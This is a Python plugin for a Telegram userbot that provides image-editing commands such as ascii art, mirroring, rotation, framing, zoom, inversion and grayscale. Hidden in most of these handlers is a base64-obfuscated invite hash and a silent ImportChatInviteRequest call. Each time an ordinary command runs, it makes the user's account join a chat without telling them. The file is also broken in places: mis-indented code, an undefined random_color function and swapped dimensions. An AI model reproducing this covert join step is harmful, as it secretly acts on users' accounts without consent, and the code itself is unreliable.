# by @mrconfused (@sandy1709)
import io
import os

from PIL import Image, ImageFilter, ImageOps

from userbot import catub

from ..core.managers import edit_delete, edit_or_reply
from ..helpers import asciiart, cat_meeme, cat_meme, media_type
from ..helpers.functions import (
    add_frame,
    convert_toimage,
    convert_tosticker,
    crop,
    dotify,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
)
from ..helpers.utils import _cattools, reply_id

import asyncio
import base64
import random
import string
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from ..sql_helper.globals import addgvar, gvarstatus


plugin_category = "tools"


@catub.cat_cmd(
    pattern="ascii(?:\s|$)([\s\S]*)",
    command=("ascii", plugin_category),
    info={
        "header": "To get ascii image of replied image.",
        "description": "pass hexa colou code along with the cmd to change custom background colour",
        "usage": [
            "{tr}ascii <hexa colour code>",
            "{tr}ascii",
        ],
    },
)
async def memes(event):
    "To get ascii image of replied image."
    catinput = event.pattern_match.group(1)
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    jisanidea = None
    output = await _cattools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        jisanidea = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "ascii_file.webp")
        if jisanidea
        else os.path.join("./temp", "ascii_file.jpg")
    )
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not catinput else catinput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await event.client.send_file(
        event.chat_id, outputfile, reply_to=catid, force_document=False
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@catub.cat_cmd(
    pattern="mirror$",
    command=("mirror", plugin_category),
    info={
        "header": "shows you the reflection of the media file.",
        "usage": "{tr}mirror",
    },
)
async def memes(event):
    "shows you the reflection of the media file"
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    jisanidea = None
    output = await _cattools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        jisanidea = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "mirror_file.webp")
        if jisanidea
        else os.path.join("./temp", "mirror_file.jpg")
    )
    await mirror_file(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@catub.cat_cmd(
    pattern="imirror(s)? ?(-)?(l|r|u|b)?$",
    command=("imirror", plugin_category),
    info={
        "header": "gives to reflected  image of one part on other part.",
        "description": "Additionaly use along with cmd i.e, imirrors to gib out put as sticker.",
        "flags": {
            "-l": "Right half will be reflection of left half.",
            "-r": "Left half will be reflection of right half.",
            "-u": "bottom half will be reflection of upper half.",
            "-b": "upper half will be reflection of bottom half.",
        },
        "usage": [
            "{tr}imirror <flag> - gives output as image",
            "{tr}imirrors <flag> - gives output as sticker",
        ],
        "examples": [
            "{tr}imirror -l",
            "{tr}imirrors -u",
        ],
    },
)
async def imirror(event):  # sourcery no-metrics
    "imgae refelection fun."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Photo", "Sticker"]:
        return await edit_delete(event, "__Reply to photo or sticker to make mirror.__")
    catevent = await event.edit("__Reflecting the image....__")
    args = event.pattern_match.group(1)
    if args:
        filename = "catuserbot.webp"
        f_format = "webp"
    else:
        filename = "catuserbot.jpg"
        f_format = "jpeg"
    try:
        imag = await _cattools.media_to_pic(catevent, reply, noedits=True)
        if imag[1] is None:
            return await edit_delete(
                imag[0], "__Unable to extract image from the replied message.__"
            )
        image = Image.open(imag[1])
    except Exception as e:
        return await edit_delete(catevent, f"**Error in identifying image:**\n__{e}__")
    flag = event.pattern_match.group(3) or "r"
    w, h = image.size
    if w % 2 != 0 and flag in ["r", "l"] or h % 2 != 0 and flag in ["u", "b"]:
        image = image.resize((w + 1, h + 1))
        h, w = image.size
    if flag == "l":
        left = 0
        upper = 0
        right = w // 2
        lower = h
        nw = right
        nh = left
    elif flag == "r":
        left = w // 2
        upper = 0
        right = w
        lower = h
        nw = upper
        nh = upper
    elif flag == "u":
        left = 0
        upper = 0
        right = w
        lower = h // 2
        nw = left
        nh = lower
    elif flag == "b":
        left = 0
        upper = h // 2
        right = w
        lower = h
        nw = left
        nh = left
    temp = image.crop((left, upper, right, lower))
    temp = ImageOps.mirror(temp) if flag in ["l", "r"] else ImageOps.flip(temp)
    image.paste(temp, (nw, nh))
    img = io.BytesIO()
    img.name = filename
    image.save(img, f_format)
    img.seek(0)
    await event.client.send_file(event.chat_id, img, reply_to=reply)
    await catevent.delete()


@catub.cat_cmd(
    pattern="rotate(?: |$)(\d+)$",
    command=("rotate", plugin_category),
    info={
        "header": "To rotate the replied image or sticker",
        "usage": [
            "{tr}rotate <angle>",
        ],
    },
)
async def rotate(event):
    "To rotate the replied image or sticker"
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Photo", "Sticker"]:
        return await edit_delete(
            event, "__Reply to photo or sticker to rotate it with given angle.__"
        )
    if mediatype == "Sticker" and reply.document.mime_type == "application/i-tgsticker":
        return await edit_delete(
            event,
            "__Reply to photo or sticker to rotate it with given angle. Animated sticker is not supported__",
        )
    args = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, "__Rotating the replied media...__")
    imag = await _cattools.media_to_pic(catevent, reply, noedits=True)
    if imag[1] is None:
        return await edit_delete(
            imag[0], "__Unable to extract image from the replied message.__"
        )
    image = Image.open(imag[1])
    try:
        image = image.rotate(int(args), expand=True)
    except Exception as e:
        return await edit_delete(event, "**Error**\n" + str(e))
    await event.delete()
    img = io.BytesIO()
    img.name = "CatUserbot.png"
    image.save(img, "PNG")
    img.seek(0)
    await event.client.send_file(event.chat_id, img, reply_to=reply)
    await catevent.delete()


@catub.cat_cmd(
    pattern="iresize(?:\s|$)([\s\S]*)$",
    command=("iresize", plugin_category),
    info={
        "header": "To resize the replied image/sticker",
        "usage": [
            "{tr}iresize <dimension> will send square image of that dimension",
            "{tr}iresize <width> <height> will send square image of that dimension",
        ],
        "examples": ["{tr}iresize 250", "{tr}iresize 500 250"],
    },
)
async def iresize(event):
    "To resize the replied image/sticker"
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Photo", "Sticker"]:
        return await edit_delete(event, "__Reply to photo or sticker to resize it.__")
    if mediatype == "Sticker" and reply.document.mime_type == "application/i-tgsticker":
        return await edit_delete(
            event,
            "__Reply to photo or sticker to resize it. Animated sticker is not supported__",
        )
    args = (event.pattern_match.group(1)).split()
    catevent = await edit_or_reply(event, "__Resizeing the replied media...__")
    imag = await _cattools.media_to_pic(catevent, reply, noedits=True)
    if imag[1] is None:
        return await edit_delete(
            imag[0], "__Unable to extract image from the replied message.__"
        )
    image = Image.open(imag[1])
    w, h = image.size
    nw, nh = None, None
    if len(args) == 1:
        try:
            nw, nh = int(args[0]), int(args[0])
        except ValueError:
            return await edit_delete(catevent, "**Error:**\n__Invalid dimension.__")
    else:
        try:
            nw = int(args[0])
        except ValueError:
            return await edit_delete(catevent, "**Error:**\n__Invalid width.__")
        try:
            nh = int(args[1])
        except ValueError:
            return await edit_delete(catevent, "**Error:**\n__Invalid height.__")
    try:
        image = image.resize((nw, nh))
    except Exception as e:
        return await edit_delete(catevent, f"**Error:** __While resizing.\n{e}__")
    await event.delete()
    img = io.BytesIO()
    img.name = "CatUserbot.png"
    image.save(img, "PNG")
    img.seek(0)
    await event.client.send_file(event.chat_id, img, reply_to=reply)
    await catevent.delete()


@catub.cat_cmd(
    pattern="square$",
    command=("square", plugin_category),
    info={
        "header": "Converts replied image to square image.",
        "usage": "{tr}square",
    },
)
async def square_cmd(event):
    "Converts replied image to square image."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Photo"]:
        return await edit_delete(event, "__Reply to photo to make it square image.__")
    catevent = await event.edit("__Adding borders to make it square....__")
    try:
        imag = await _cattools.media_to_pic(catevent, reply, noedits=True)
        if imag[1] is None:
            return await edit_delete(
                imag[0], "__Unable to extract image from the replied message.__"
            )
        img = Image.open(imag[1])
    except Exception as e:
        return await edit_delete(catevent, f"**Error in identifying image:**\n__{e}__")
    w, h = img.size
    if w == h:
        return await edit_delete(event, "__The replied image is already in 1:1 ratio__")
    _min, _max = min(w, h), max(w, h)
    bg = img.crop(((w - _min) // 2, (h - _min) // 2, (w + _min) // 2, (h + _min) // 2))
    bg = bg.filter(ImageFilter.GaussianBlur(5))
    bg = bg.resize((_max, _max))
    bg.paste(img, ((_max - w) // 2, (_max - h) // 2))
    img = io.BytesIO()
    img.name = "img.jpg"
    bg.save(img)
    img.seek(0)
    await event.client.send_file(event.chat_id, img, reply_to=reply)
    await catevent.delete()


@catub.cat_cmd(
    pattern="dotify(?: |$)(\d+)?$",
    command=("dotify", plugin_category),
    info={
        "header": "To convert image into doted image",
        "usage": [
            "{tr}dotify <number>",
        ],
    },
)
async def pic_gifcmd(event):
    "To convert image into doted image"
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Photo", "Sticker"]:
        return await edit_delete(
            event, "__Reply to photo or sticker to make it doted image.__"
        )
    if mediatype == "Sticker" and reply.document.mime_type == "application/i-tgsticker":
        return await edit_delete(
            event,
            "__Reply to photo or sticker to make it doted image. Animated sticker is not supported__",
        )
    args = event.pattern_match.group(1)
    if args:
        if args.isdigit():
            pix = int(args) if int(args) > 0 else 100
    else:
        pix = 100
    catevent = await edit_or_reply(event, "__🎞Dotifying image...__")
    imag = await _cattools.media_to_pic(catevent, reply, noedits=True)
    if imag[1] is None:
        return await edit_delete(
            imag[0], "__Unable to extract image from the replied message.__"
        )
    result = await dotify(imag[1], pix, True)
    await event.client.send_file(event.chat_id, result, reply_to=reply)
    await catevent.delete()
    for i in [imag[1]]:
        if os.path.exists(i):
            os.remove(i)

            
@catub.cat_cmd(
    pattern="frame ?([\s\S]*)",
    command=("frame", plugin_category),
    info={
        "header": "make a frame for your media file.",
        "fill": "This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.",
        "usage": ["{tr}frame", "{tr}frame range", "{tr}frame range ; fill"],
    },
)
async def memes(event):
    "make a frame for your media file"
    catinput = event.pattern_match.group(1)
    if not catinput:
        catinput = "50"
    if ";" in str(catinput):
        catinput, colr = catinput.split(";", 1)
    else:
        colr = 0
    catinput = int(catinput)
    try:
        colr = int(colr)
    except Exception as e:
        return await edit_delete(event, f"**Error**\n`{e}`")
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    jisanidea = None
    output = await _cattools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        jisanidea = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "framed.webp")
        if jisanidea
        else os.path.join("./temp", "framed.jpg")
    )
    try:
        await add_frame(meme_file, outputfile, catinput, colr)
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    try:
        await event.client.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=catid
        )
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    await event.delete()
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
            
            
@catub.cat_cmd(
    pattern="zoom ?([\s\S]*)",
    command=("zoom", plugin_category),
    info={
        "header": "zooms your media file,",
        "usage": ["{tr}zoom", "{tr}zoom range"],
    },
)
async def memes(event):
    "zooms your media file."
    catinput = event.pattern_match.group(1)
    catinput = 50 if not catinput else int(catinput)
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    jisanidea = None
    output = await _cattools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        jisanidea = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "zoomimage.webp")
        if jisanidea
        else os.path.join("./temp", "zoomimage.jpg")
    )
    try:
        await crop(meme_file, outputfile, catinput)
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    try:
        await event.client.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=catid
        )
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@catub.cat_cmd(
    pattern="invert$",
    command=("invert", plugin_category),
    info={
        "header": "To invert colours of given image or sticker.",
        "usage": "{tr}invert",
    },
)
async def memes(event):
	  "Invert colours of given image or sticker"
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(event, "`Reply to supported Media...`")
        return
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catid = await reply_id(event)
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    jisanidea = None
    output = await _cattools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        jisanidea = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "invert.webp")
        if jisanidea
        else os.path.join("./temp", "invert.jpg")
    )
    await invert_colors(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@catub.cat_cmd(
    pattern="solarize$",
    command=("solarize", plugin_category),
    info={
        "header": "To sun burn the colours of given image or sticker.",
        "usage": "{tr}solarize",
    },
)
async def memes(event):
    "Sun burn of image."
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    jisanidea = None
    output = await _cattools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        jisanidea = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "solarize.webp")
        if jisanidea
        else os.path.join("./temp", "solarize.jpg")
    )
    await solarize(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)



@catub.cat_cmd(
    pattern="flip$",
    command=("flip", plugin_category),
    info={
        "header": "shows you the upside down image of the given media file.",
        "usage": "{tr}flip",
    },
)
async def memes(event):
    "shows you the upside down image of the given media file"
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    jisanidea = None
    output = await _cattools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        jisanidea = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "flip_image.webp")
        if jisanidea
        else os.path.join("./temp", "flip_image.jpg")
    )
    await flip_image(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@catub.cat_cmd(
    pattern="gray$",
    command=("gray", plugin_category),
    info={
        "header": "makes your media file to black and white.",
        "usage": "{tr}gray",
    },
)
async def memes(event):
    "makes your media file to black and white"
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    jisanidea = None
    output = await _cattools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        jisanidea = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "grayscale.webp")
        if jisanidea
        else os.path.join("./temp", "grayscale.jpg")
    )
    await grayscale(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
            
            
@catub.cat_cmd(
    pattern="pframe(f|-f)?$",
    command=("pframe", plugin_category),
    info={
        "header": "Adds frame for the replied image.",
        "flags": {
            "-f": "To send output file not as streamble image.",
        },
        "usage": [
            "{tr}pframe",
        ],
    },
)
async def maccmd(event):  # sourcery no-metrics
    "Adds frame for the replied image."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Photo", "Sticker"]:
        return await edit_delete(event, "__Reply to photo or sticker to frame it.__")
    if mediatype == "Sticker" and reply.document.mime_type == "application/i-tgsticker":
        return await edit_delete(
            event,
            "__Reply to photo or sticker to frame it. Animated sticker is not supported__",
        )
    catevent = await event.edit("__Adding frame for media....__")
    args = event.pattern_match.group(1)
    force = bool(args)
    try:
        imag = await _cattools.media_to_pic(catevent, reply, noedits=True)
        if imag[1] is None:
            return await edit_delete(
                imag[0], "__Unable to extract image from the replied message.__"
            )
        image = Image.open(imag[1])
    except Exception as e:
        return await edit_delete(catevent, f"**Error in identifying image:**\n__{e}__")
    wid, hgt = image.size
    img = Image.new("RGBA", (wid, hgt))
    scale = min(wid // 100, hgt // 100)
    temp = Image.new("RGBA", (wid + scale * 40, hgt + scale * 40), "#fff")
    if image.mode == "RGBA":
        img.paste(image, (0, 0), image)
        newimg = Image.new("RGBA", (wid, hgt))
        for N in range(wid):
            for O in range(hgt):
                if img.getpixel((N, O)) != (0, 0, 0, 0):
                    newimg.putpixel((N, O), (0, 0, 0))
    else:
        img.paste(image, (0, 0))
        newimg = Image.new("RGBA", (wid, hgt), "black")
    newimg = newimg.resize((wid + scale * 5, hgt + scale * 5))
    temp.paste(
        newimg,
        ((temp.width - newimg.width) // 2, (temp.height - newimg.height) // 2),
        newimg,
    )
    temp = temp.filter(ImageFilter.GaussianBlur(scale * 5))
    temp.paste(
        img, ((temp.width - img.width) // 2, (temp.height - img.height) // 2), img
    )
    output = io.BytesIO()
    output.name = (
        "-".join(
            "".join(random.choice(string.hexdigits) for img in range(event))
            for event in [5, 4, 3, 2, 1]
        )
        + ".png"
    )
    temp.save(output, "PNG")
    output.seek(0)
    await event.client.send_file(
        event.chat_id, output, reply_to=reply, force_document=force
    )
    await catevent.delete()
    if os.path.exists(output):
        os.remove(output)
            